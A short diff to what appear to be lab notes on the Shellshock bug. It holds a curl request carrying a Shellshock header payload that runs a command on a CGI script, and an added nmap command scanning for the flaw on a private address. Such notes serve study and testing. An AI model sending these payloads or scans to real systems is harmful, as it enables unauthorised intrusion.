@@ -28,3 +28,6 @@ curl 172.17.0.2/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type
 id
 
 
+4. detecting shellsock with nmap
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/index.bash 172.16.131.132
+
